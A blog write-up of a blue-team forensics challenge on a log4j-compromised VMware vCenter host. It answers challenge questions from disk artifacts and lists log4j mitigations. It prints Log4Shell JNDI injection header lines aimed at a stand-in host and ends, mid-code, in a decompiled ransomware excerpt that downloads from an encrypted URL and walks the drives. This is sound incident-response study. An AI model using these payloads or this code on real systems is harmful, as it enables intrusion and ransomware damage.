<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö" /><meta property="og:locale" content="en" /><meta name="description" content="Point: 2000" /><meta property="og:description" content="Point: 2000" /><link rel="canonical" href="https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/" /><meta property="og:url" content="https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/" /><meta property="og:site_name" content="(B)rootware Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-19T15:45:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö" /><meta name="twitter:site" content="@brootware" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-03-07T18:42:19+08:00","datePublished":"2022-02-19T15:45:00+08:00","description":"Point: 2000","mainEntityOfPage":{"@type":"WebPage","@id":"https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/"},"url":"https://brootware.github.io/posts/detecting-and-defending-against-log4j-attacks/","@type":"BlogPosting","headline":"Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö","@context":"https://schema.org"}</script><title>Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö | (B)rootware Research</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="(B)rootware Research"><meta name="application-name" content="(B)rootware Research"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/7734956?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">(B)rootware Research</a></div><div class="site-subtitle font-italic">Cloud DevOps / Site Reliability Engineering, Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/brootware" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/brootware" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/oakermin" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Detecting and defending against log4j attacks ü™µ 4Ô∏è‚É£ üêö</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/brootware">Oaker Min (Bruce)</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-02-19 15:45:00 +0800" data-toggle="tooltip" data-placement="bottom" title="Sat, Feb 19, 2022, 3:45 PM +0800" >Feb 19, 2022</em> </span> <span> Updated <em class="timeago" date="2022-03-07 18:42:19 +0800 " data-toggle="tooltip" data-placement="bottom" title="Mon, Mar 7, 2022, 6:42 PM +0800" >Mar 7, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1416 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><p>Point: 2000</p><p><a href="https://cyberdefenders.org/blueteam-ctf-challenges/progress/rootware/86/"><img data-src="https://img.shields.io/badge/completed-detectlog4j-brightgreen.svg" data-proofer-ignore></a></p><h2 id="category">Category<a href="#category" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Forensics, Reverse-engineering</p><h2 id="challenge-details">Challenge Details<a href="#challenge-details" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>For the last week, log4shell vulnerability has been gaining much attention not for its ability to execute arbitrary commands on the vulnerable system but for the wide range of products that depend on the log4j library. Many of them are not known till now. We created a challenge to test your ability to detect, analyze, mitigate and patch products vulnerable to log4shell.</p><h2 id="solution">Solution<a href="#solution" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="1">1<a href="#1" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the computer hostname?</p><p><strong>hostname: VCW65</strong></p><p>The computer hostname can be found in the network setup log file which is recording the domain join activity. The path to the file is <code class="language-plaintext highlighter-rouge">C:\Windows\debug\NetSetup.LOG</code></p><p><img data-src="https://bn1304files.storage.live.com/y4mvMpR2P8poC6d0ZTWWvXTsqLjViACMRWQpsCMPdMpAHWOJxWCNlUaJh3SB8QcoKDYFWBpxC-8lZLHMfBDgbD5SGEE4krYR0gX00jYodWucO-b2iHacKYJ9Tg829xV2Ep61524jSR5bCHXbaGw0EDomGmJYUraKVIR-SZapRjI-whralFQYoNTwhMDS2LpO-ds?width=1087&amp;height=615&amp;cropmode=none" alt="netsetup" data-proofer-ignore></p><h3 id="2">2<a href="#2" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the Timezone of the compromised machine?</p><p><strong>UTC-8</strong></p><p>Using Autopsy, you are able to view registry files through <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry in the following path:</p><p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\config\SYSTEM</code></p><p>Open the <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry file &gt; go to ControlSet001 &gt; Control &gt; TimeZoneInformation &gt; TimeZoneKeyName</p><p><img data-src="https://bn1304files.storage.live.com/y4mUHokbOOaRUB7G0OkBXEd47uBdaU7IcsgvsD5wqpIMr5YElLJLs_QkwZnO3sGX2yjvu8g7g52nvjWhONaM2RILGTqlD2zAj_ijxWEij1dTj9QlNy10itkNTFYH0WQHeBf9GX-baqwnhocOyqDueEQeo_vvhYqxh9gXzDtFqBhL4dFdWlAFbpISm7HI9ZtZcn7?width=842&amp;height=321&amp;cropmode=none" alt="timezone" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">Pacific Standard Time</code></p><p>We can see that the time zone is in PST. By default PST and UTC have difference of 8 hours</p><h3 id="3">3<a href="#3" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the current build number on the system?</p><p><strong>The current build number is 14393.</strong></p><p>The current windows build number can be found via <code class="language-plaintext highlighter-rouge">SOFTWARE</code> registry within Autopsy via this path.</p><p><code class="language-plaintext highlighter-rouge">C:\Windows\System32\config\SOFTWARE</code></p><p>Open the <code class="language-plaintext highlighter-rouge">SOFTWARE</code> registry file &gt; Microsoft &gt; Windows NT &gt; CurrentVersion</p><p><img data-src="https://bn1304files.storage.live.com/y4mUPxSENPIwlWhqg6TqiSsBJq_-m8_MysmMFaVdGeokC3itbe0hhRkNORbNKkcwDk21ow23lDBAg0ACAoNS7kCkgBBxiBLwik7xDuUiZxH11W4xd075jj65o1ya3AsiX3Vd7hIluDDo-BCwbD7P3cszc8BazlayV9vRHkqQ6AJsDbp3xHkCRsAV53DItsChdPz?width=1750&amp;height=794&amp;cropmode=none" alt="buildversion" data-proofer-ignore></p><h3 id="4">4<a href="#4" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the computer IP?</p><p><strong>The IP address is 192.168.112.139</strong></p><p>The IP address of the computer can be found in previous <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry as follow.</p><p>Open the <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry file &gt; go to ControlSet002 &gt; Services &gt; Tcpip &gt; Parameters &gt; Interfaces &gt; <code class="language-plaintext highlighter-rouge">{82e9...}</code></p><p><img data-src="https://bn1304files.storage.live.com/y4mhgdjeFanInLrqF1BS7uRSVKnEQdj1ABGHDserm5KzKnFGZGNdwHmuE3EO3FW03QPp_CQG9rjvl9NU23zUOs0Vsf1XCqbQxXdCl7aTz4rSAMteP-osRYbwXrKWs7Pl7T4jDOQ2CmqhAMW5igrK6OzPovMidITlp-BuIWV4nEYvXhO7lvnY6KaxMivWICnn_o3?width=1866&amp;height=1118&amp;cropmode=none" alt="ipaddress" data-proofer-ignore></p><h3 id="5">5<a href="#5" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the domain computer was assigned to?</p><p><strong>cyberdefenders.org</strong></p><p>The domain of the computer can be found in previous <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry as follow.</p><p>Open the <code class="language-plaintext highlighter-rouge">SYSTEM</code> registry file &gt; go to ControlSet002 &gt; Services &gt; Tcpip &gt; Parameters</p><p><img data-src="https://bn1304files.storage.live.com/y4mLpXSz-vKnFRNVNs-s3a_oP8RHtsy9QJi-Xtauy0ySpmJ18CjO7I19C81BqU3GvJwQA_TAa7TpXV1aFBeMcwrkr4J-KeKSwozXgg8wtnEqabcB2PTbyllj7LomMFLwkZDg6u4PSyUngLV-EIvi0ZKurb0xPl8l_UU33A2hpJ9iFs623pwpxCSOK_T48hatDqu?width=1866&amp;height=1118&amp;cropmode=none" alt="domain" data-proofer-ignore></p><h3 id="6">6<a href="#6" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>When was myoussef user created?</p><p><strong>2021-12-28 06:57:23 UTC</strong></p><p>From Autopsy, go to OS Accounts under the tree view on the left and search for the user <strong>myoussef</strong> in the results as below.</p><p><img data-src="https://bn1304files.storage.live.com/y4m0bXXTErxVKX3e5d3bzL3ORtvdvj4t8gPt2EsjGRJp-LGUYhcBIHGL_2t-03uQnJ86L9D7hOT_siH5jerbD-InD5dSKm3zgzenP4FSTDZwjJoFyFJ-FfaCdnLzyH0ZUlKdSJIh7auyV0gCy8yXDejGHpCyLSSrmKiAnda2i5SUmqfBEsCGr_lh3rZKqDA51P7?width=1263&amp;height=727&amp;cropmode=none" alt="image" data-proofer-ignore></p><h3 id="7">7<a href="#7" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the user mhasan password hint?</p><p><a href="https://www.linkedin.com/in/0xmohamedhasan/">https://www.linkedin.com/in/0xmohamedhasan/</a></p><p>We can see from the results that mhasan‚Äôs password hint is a linkedin profile.</p><p><img data-src="https://bn1304files.storage.live.com/y4mm3hPXnFnsTIm-BUBauioSRmclK-Gv2BqmtotOdOnQ-HsWS5vZs-JKc0LeeZKg8SPsNk17l4TX0mJsYdpYZgfNJYog1w7GSTlWP9LG41WIz5XA6DBxmjiHfJnQaHOA8IhyPkQNaamoShXQ6KLE2t0YGQkhSegQDOlgd6M0MewevNBvJDCBjgRs7PkI0orhDsi?width=1263&amp;height=727&amp;cropmode=none" alt="image" data-proofer-ignore></p><h3 id="8">8<a href="#8" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the version of the VMware product installed on the machine?</p><p><strong>6.7.0.40322</strong></p><p>The version of VMWare product installed can be checked via <em>Installed programs</em> can be shown under <em>Data Artifacts</em> &gt; <em>Installed Programs</em></p><p><img data-src="https://bn1304files.storage.live.com/y4mG-18VENRg3Y3Fz-D20P6jT_u46bItT6azYAOnkhzgcXTbdQa4hNn1I4Ydk4ujb8mtZAY36FtFwY2uXMVj-A7vVR_wI61aU7bAr2-EEm1oujtvnNTQAPCaxz9GSi1S0awXKijh8VMARP_qkr3Mwi9kIDH_MShMp5OOixyb5RojMXC4cHSZ5q36EycGcW5FLjt?width=945&amp;height=84&amp;cropmode=none" alt="image" data-proofer-ignore></p><h3 id="9">9<a href="#9" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the version of the log4j library used by the installed VMware product?</p><p><strong>2.11.2</strong></p><p>The version of log4j library VMWare product is using can be checked in the following path via Autopsy.</p><p><code class="language-plaintext highlighter-rouge">C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar</code></p><h3 id="10">10<a href="#10" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the log4j library log level specified in the configuration file?</p><p><strong>info</strong></p><p>This needed some digging as the log4j.properties is the main config file that keeps log4j configurations in key-value pairs. So a keyword search was done via Autopsy to look for log4j.properties file within the disk.</p><p><img data-src="https://bn1304files.storage.live.com/y4mwChnRyY8rOnBNu6xgROT2-ISrDlmrBvxgsau0sbEY4_OJqhSZXHo1xP81Iau_N0qY4XTDiwmLgBskBVsYDYF3NyeNqbm-IFc3aFQZIaLSF96bQA-EzUonLAqYOFyVqmKVXdbdqnE0DBf81racn0okKG0KemSdsuQCKTU6b_-hxLOZ0YwQ-CfaUgW3xBqAb3U?width=2304&amp;height=1350&amp;cropmode=none" alt="image" data-proofer-ignore></p><h3 id="11">11<a href="#11" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>The attacker exploited log4shell through an HTTP login request. What is the HTTP header used to inject payload?</p><p><code class="language-plaintext highlighter-rouge">X-Forwarded-For</code></p><p>By searching around on google for log4shell exploit through HTTP header I come across a <a href="https://runpanther.io/blog/panthers-guide-to-log4j-exploitation-prevention-and-detection/">blog</a> using below headers to inject the payload.</p><div class="language-text highlighter-rouge"><div class="code-header"> <span label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Referer=${jndi:ldap://example.com/‚Ä¶}
X-Forwarded-For=${jndi:ldap://example.com/‚Ä¶}
User-Agent=${jndi:ldap://example.com/‚Ä¶}
</pre></table></code></div></div><p>With the hint given in the question, the answer was deduced.</p><h3 id="12">12<a href="#12" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>The attacker used the log4shell.huntress.com payload to detect if vcenter instance is vulnerable. What is the first link of the log4huntress payload?</p><p><strong>log4shell.huntress.com:1389/b1292f3c-a652-4240-8fb4-59c43141f55a</strong></p><p>A search for the keyword ‚Äúlog4shell.huntress.com‚Äù is crafted, then found a websso.log in the Result Viewer. From the result viewer the first link of log4shell payload can be found.</p><h3 id="13">13<a href="#13" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>When was the first successful login to vsphere WebClient?</p><p><strong>28/12/2021 20:39:29 UTC</strong></p><p>The login event can be found via VMWare‚Äôs <code class="language-plaintext highlighter-rouge">audit_events.log</code> found in the path below via Autopsy.</p><p><code class="language-plaintext highlighter-rouge">C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log</code></p><h3 id="14">14<a href="#14" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the attacker‚Äôs IP address?</p><p><strong>192.168.112.128</strong></p><p>The attacker‚Äôs ip address can be found via the same <code class="language-plaintext highlighter-rouge">audit_events.log</code> via Autopsy.</p><p><code class="language-plaintext highlighter-rouge">C:\Program Files\VMWare\vCenterServer\runtime\VMWareSTSService\logs\audit_events.log</code></p><h3 id="15">15<a href="#15" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the port the attacker used to receive the cobalt strike reverse shell?</p><p><strong>1337</strong></p><p>Cobalt Strike is usually used with a Base64 encoded PowerShell command. The lowest hanging fruit would be to identify the attack by going through <code class="language-plaintext highlighter-rouge">Microsoft-Windows-PowerShell%4Operational.evtx</code>. Sure enough a Base64 encoded was found in the logs which decodes to <code class="language-plaintext highlighter-rouge">192.168.112:128:1337</code></p><h3 id="16">16<a href="#16" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the script name published by VMware to mitigate log4shell vulnerability?</p><p><strong>vc_log4j_mitigator.py</strong></p><p>By digging on google, VMWare has published a <a href="https://kb.vmware.com/s/article/87081">blog</a> on mitigating the vulnerability.</p><h3 id="17">17<a href="#17" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>In some cases, you may not be able to update the products used in your network. What is the system property needed to set to ‚Äòtrue‚Äô to work around the log4shell vulnerability?</p><p><strong>log4j2.formatMsgNoLookups</strong></p><p>By googling <em>change system property to mitigate log4shell vulnerability</em>, an article published by [jfrog] has stated a mitigation method that disables lookups by setting the system property as below.</p><p><code class="language-plaintext highlighter-rouge">log4j2.formatMsgNoLookups=True</code></p><h3 id="18">18<a href="#18" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the log4j version which contains a patch to CVE-2021-44228?</p><p><strong>2.15.0</strong></p><h3 id="19">19<a href="#19" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Removing JNDIlookup.class may help in mitigating log4shell. What is the sha256 hash of the JNDILookup.class?</p><p><code class="language-plaintext highlighter-rouge">0f038a1e0aa0aff76d66d1440c88a2b35a3d023ad8b2e3bac8e25a3208499f7e</code></p><p>Simply extract the <code class="language-plaintext highlighter-rouge">log4j-core-2.11.2jar</code> file from the below path via Autopsy.</p><p><code class="language-plaintext highlighter-rouge">C:\Program Files\VMWare\vCenter Server\common-jars\log4j-core-2.11.2jar</code></p><p>The <code class="language-plaintext highlighter-rouge">JndiLookup.class</code> file needs to be further extracted from <code class="language-plaintext highlighter-rouge">log4j-core-2.11.2jar</code>. This can be done using 7zip or any unzipping software.</p><p>Once that file is extracted, sha256 hash of the class can be computed as below.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">Get-FileHash</span><span class="w"> </span><span class="o">.</span><span class="nx">\JndiLookup.class</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w">
</span><span class="nx">Algorithm</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">SHA256</span><span class="w">
</span><span class="n">Hash</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">0F038A1E0AA0AFF76D66D1440C88A2B35A3D023AD8B2E3BAC8E25A3208499F7E</span><span class="w">
</span><span class="n">Path</span><span class="w">      </span><span class="p">:</span><span class="w"> </span><span class="nx">C:\Users\uname\Desktop\Log4shell\log4j-core-2.11.2\org\apache\logging\log4j\core\lookup\JndiLookup.class</span><span class="w">
</span></pre></table></code></div></div><h3 id="20">20<a href="#20" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Analyze JNDILookup.class. What is the value stored in the CONTAINER_JNDI_RESOURCE_PATH_PREFIX variable?</p><p><strong>java:comp/env/</strong></p><p>The <code class="language-plaintext highlighter-rouge">CONTAINER_JNDI_RESOURCE_PATH_PREFIX</code> can be found in the path below.</p><p><code class="language-plaintext highlighter-rouge">C:\Program Files\VMWare\vCenter Server\cm\lib\log4j-core.jar</code></p><h3 id="21">21<a href="#21" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>What is the executable used by the attacker to gain persistence?</p><p><strong>baaaackdooor.exe</strong></p><p>The exe can be discovered in the below path.</p><p><code class="language-plaintext highlighter-rouge">C:\Users\Administrator.WIN-B633EO9K91M\NTUSER.DAT</code></p><p>Click on <code class="language-plaintext highlighter-rouge">NTUSER.DAT</code> and expand SOFTWARE &gt; Microsoft &gt; Windows &gt; CurrentVersion, then click on RunOnce</p><p><img data-src="https://bn1304files.storage.live.com/y4m-MfURx-wckc2prfwd5uehJGrZjPqAnVYEISxG2yXNT_apP62yceHAzQOuXi-WnER10oyK9wZA15UzD7JdbLKXUyVesSlrjIef6oBapnt9NfgvSwWPbmbal90SgFnD1s9qey23mKqeqUSFg2Ue_ijOrS5tMv01bz0eYgUyGKBu0rVL6k928il8QjGgfttGKJU?width=2122&amp;height=1372&amp;cropmode=none" alt="image" data-proofer-ignore></p><h3 id="22">22<a href="#22" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>When was the first submission of ransomware to virustotal?</p><p><strong>2021-12-11 22:57:01</strong></p><p>The sha256 hash: <code class="language-plaintext highlighter-rouge">f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789</code> of <code class="language-plaintext highlighter-rouge">baaaackdooor.exe</code> can be searched on Virustotal for First Submission under history.</p><h3 id="23">23<a href="#23" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?</p><p><strong>‚ÄúGoaahQrC‚Äù</strong></p><p>More research is done on this ransomeware via virustotal an detailed article on khonsari malware for apache log4j is found and was able to get the key to decrypt.</p><p><a href="https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/">https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/</a></p><blockquote class="prompt-info"><p><code class="language-plaintext highlighter-rouge">info</code> Another way to get the key is to reverse engineer the malware.</p></blockquote><p>Using the <code class="language-plaintext highlighter-rouge">f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789</code> from question 23, we can download the malware from <a href="https://bazaar.abuse.ch/">https://bazaar.abuse.ch/</a> and open it up in <a href="https://github.com/dnSpy/dnSpy#:~:text=dnSpy%20is%20a%20debugger%20and,Main%20features%3A&amp;text=NET%20and%20Unity%20assemblies">dnspy</a>, a .Net debugger.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre><span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">()</span>
 <span class="p">{</span>
  <span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;</span> <span class="n">list</span> <span class="p">=</span> <span class="k">new</span> <span class="n">List</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">&gt;();</span>
  <span class="n">WebClient</span> <span class="n">webClient</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebClient</span><span class="p">();</span>
  <span class="kt">string</span> <span class="n">text</span> <span class="p">=</span> <span class="s">"/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c&gt;\u0002\t=\u0016,\u0018\v\u0004&gt;\u0018\u007f\u0006;3"</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">text2</span> <span class="p">=</span> <span class="n">text</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">edhcLlqR</span> <span class="p">=</span> <span class="n">text2</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">text3</span> <span class="p">=</span> <span class="s">"GoaahQrC"</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">text4</span> <span class="p">=</span> <span class="n">text3</span><span class="p">;</span>
  <span class="kt">string</span> <span class="n">vnNtUrJn</span> <span class="p">=</span> <span class="n">text4</span><span class="p">;</span>
  <span class="n">webClient</span><span class="p">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="n">oymxyeRJ</span><span class="p">.</span><span class="nf">CajLqoCk</span><span class="p">(</span><span class="n">edhcLlqR</span><span class="p">,</span> <span class="n">vnNtUrJn</span><span class="p">));</span>
  <span class="k">foreach</span> <span class="p">(</span><span class="n">DriveInfo</span> <span class="n">driveInfo</span> <span class="k">in</span> <span class="n">DriveInfo</span><span class="p">.</span><span class="nf">GetDrives</span><span class="p">())</span>
  <span class="p">{</span>
   <span class="kt">string</span> <span class="n">name</span> <span class="p">=</span> <span class="n">driveInfo</span><span class="p">.</span><span class="n">Name</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">text5</span> <span class="p">=</span> <span class="s">"2w\u0015"</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">text6</span> <span class="p">=</span> <span class="n">text5</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">edhcLlqR2</span> <span class="p">=</span> <span class="n">text6</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">text7</span> <span class="p">=</span> <span class="s">"qMIamfMA"</span><span class="p">;</span>
   <span class="kt">string</span> <span class="n">text8</span> <span class="p">=</span> <span class="n">text7</span><span class="p">;</span>
